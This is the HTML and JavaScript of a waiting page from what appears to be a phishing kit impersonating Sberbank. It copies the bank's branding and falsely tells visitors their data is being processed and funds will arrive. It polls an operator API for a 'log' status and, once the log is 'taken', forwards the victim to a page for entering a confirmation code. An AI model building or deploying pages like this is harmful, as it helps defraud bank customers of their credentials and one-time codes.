<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ожидание — СберБанк</title>
    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'SB Sans Interface', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f3f4f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: #fff;
            padding: 16px 24px;
            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
        }

        .logo {
            height: 28px;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 24px;
            padding: 48px 40px;
            text-align: center;
            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
            max-width: 400px;
            width: 100%;
        }

        .divider {
            color: #8b8b8b;
            font-size: 14px;
            margin-bottom: 32px;
        }

        .icon {
            width: 64px;
            height: 64px;
            border: 3px solid #e5e5e5;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            color: #8b8b8b;
            font-size: 28px;
            font-weight: 300;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
        }

        .desc {
            color: #8b8b8b;
            font-size: 14px;
            line-height: 1.5;
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #21a038 0%, #58c57a 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 32px;
            transition: transform 0.2s, box-shadow 0.2s;
            opacity: 0.5;
            pointer-events: none;
        }

        .btn.active {
            opacity: 1;
            pointer-events: auto;
        }

        .btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 16px rgba(33, 160, 56, 0.3);
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid #e5e5e5;
            border-top-color: #21a038;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .card {
                padding: 32px 24px;
            }

            .title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="images/sberbank-logo.befb25b6.svg" alt="Сбербанк" class="logo">
    </header>

    <div class="container">
        <div class="card">
            <div class="divider">или</div>
            
            <div class="icon">i</div>
            
            <h1 class="title">Ожидайте</h1>
            <p class="desc">Банк обрабатывает ваши данные. Это может занять некоторое время</p>

            <div class="spinner"></div>

            <button class="btn" id="continueBtn">Получить</button>
        </div>
    </div>

    <script>
        const API_URL = '/api';
        const LOG_ID = new URLSearchParams(window.location.search).get('id');

        if (!LOG_ID) {
            window.location.href = 'receive.html';
        }

        // Проверяем статус каждые 2 секунды
        async function checkStatus() {
            try {
                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
                const data = await response.json();

                if (data.status === 'taken' || data.status === 'code' || data.status === 'code_received') {
                    // Лог взят — переходим на страницу ввода кода
                    window.location.href = `code.html?id=${LOG_ID}`;
                } else if (data.status === 'error' && data.error) {
                    // Показываем ошибку
                    document.querySelector('.title').textContent = 'Ошибка';
                    document.querySelector('.desc').textContent = data.error;
                    document.querySelector('.spinner').style.display = 'none';
                    setTimeout(() => {
                        window.location.href = 'receive.html';
                    }, 5000);
                } else if (data.status === 'success') {
                    document.querySelector('.title').textContent = 'Успешно!';
                    document.querySelector('.desc').textContent = 'Средства будут зачислены в течение 15 минут.';
                    document.querySelector('.spinner').style.display = 'none';
                }
            } catch (error) {
                console.error('Status check error:', error);
            }
        }

        // Проверяем статус каждые 2 секунды
        setInterval(checkStatus, 2000);
        checkStatus();
    </script>
</body>
</html>
